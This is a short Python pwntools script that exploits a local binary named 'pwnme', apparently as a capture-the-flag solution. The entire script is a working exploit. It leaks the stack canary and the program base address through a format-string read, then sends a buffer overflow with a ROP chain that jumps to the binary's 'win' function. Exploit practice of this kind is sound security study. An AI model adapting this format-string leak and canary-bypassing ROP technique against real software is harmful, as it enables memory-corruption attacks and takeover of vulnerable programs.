from pwn import *

elf = ELF('./pwnme')
io = elf.process()

gs = '''
    continue
'''

if args.GDB:
    gdb.attach(io,gs)


fmt = b'%11$p %13$p |'

offset_to_canary = 24

io.sendlineafter(b'?',fmt)

leak = io.recvuntil(b'|').split(b' ')
elf.address = int(leak[0],16)-0x1100
canary = int(leak[1],16)


log.success(f'canary value @ 0x{canary:02x}')
log.success(f'base address @ 0x{elf.address:02x}')

pop_rdi = elf.address + 0x0000000000001383
ret = elf.address + 0x000000000000101a

payload = b''.join([
        b'A'*offset_to_canary,
        p64(canary),
        p64(0x4141414141414141),
        p64(pop_rdi),
        p64(0x00000000deadbeef),
        p64(ret),
        p64(elf.sym.win),
    ])

io.sendline(payload)
io.interactive()
